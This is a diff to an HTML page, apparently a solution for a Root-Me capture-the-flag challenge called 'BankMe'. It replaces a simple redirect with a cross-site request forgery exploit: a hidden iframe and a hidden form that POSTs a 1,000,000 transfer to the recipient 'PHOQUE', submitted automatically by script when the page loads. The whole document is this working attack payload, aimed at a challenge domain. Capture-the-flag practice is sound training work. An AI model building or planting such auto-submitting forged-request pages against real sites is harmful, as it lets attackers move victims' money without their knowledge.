@@ -2,13 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirection vers BankMe</title>
+    <title>CSRF Exploit with Iframe - BankMe</title>
 </head>
 <body>
-    <h1>Redirection en cours...</h1>
+    <h1>Initiating Transfer...</h1>
+    <!-- Iframe pointant vers la page de transfert -->
+    <iframe src="https://bankme-1.challenges.pro.root-me.org/transfer/" style="display:none;" name="csrf-iframe"></iframe>
+    
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST" target="csrf-iframe">
+        <input type="hidden" name="recipient" value="PHOQUE">
+        <input type="hidden" name="amount" value="1000000">
+        <input type="submit" value="Send Transfer" style="display:none;">
+    </form>
+    
     <script>
-        // Redirige automatiquement vers la page de transfert avec les paramètres appropriés
-        window.location.href = "https://bankme-1.challenges.pro.root-me.org/transfer/?recipient=PHOQUE&amount=1000000";
+        // Soumission automatique du formulaire
+        document.forms[0].submit();
     </script>
 </body>
 </html>
